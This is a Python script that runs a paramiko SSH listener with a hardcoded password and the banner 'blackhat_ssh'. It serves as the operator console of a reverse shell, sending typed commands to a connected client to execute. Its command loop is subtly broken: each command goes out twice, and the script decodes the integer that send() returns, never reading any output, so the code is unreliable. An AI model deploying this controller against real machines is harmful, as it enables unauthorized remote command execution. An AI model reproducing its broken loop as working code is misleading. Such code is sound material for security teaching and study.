import os
import paramiko
import socket
import sys
import threading

CWD = os.path.dirname(os.path.realpath(__file__))
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))

class Server (paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if (username == 'tim') and (password == 'sekret'):
            return paramiko.AUTH_SUCCESSFUL

if __name__ == '__main__':
    server = '127.0.0.1'
    ssh_port = 2222
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, ssh_port))
        sock.listen(100)
        print('[+] Listen for connection ...')
        client, addr = sock.accept()
    except Exception as e:
        print(f'[-] Listen failed: {str(e)}')
        sys.exit(1)
    else:
        print('[+] Got a connection!', client, addr)

    session = paramiko.Transport(client)
    session.add_server_key(HOSTKEY)
    server = Server()
    session.start_server(server=server)

    chan = session.accept(20)
    if chan is None:
        print('*** No channel.')
        sys.exit(1)

    print('[+] Authenticated!')
    print(chan.recv(1024))
    chan.send('Welcome to blackhat_ssh')
    try:
        while True:
            command = input('Enter command: ')
            if command != 'exit':
                chan.send(command)
                r = chan.send(command)
                print(r.decode())
            else:
                chan.send('exit')
                print('Exiting...')
                session.close()
                break
    except KeyboardInterrupt:
        session.close()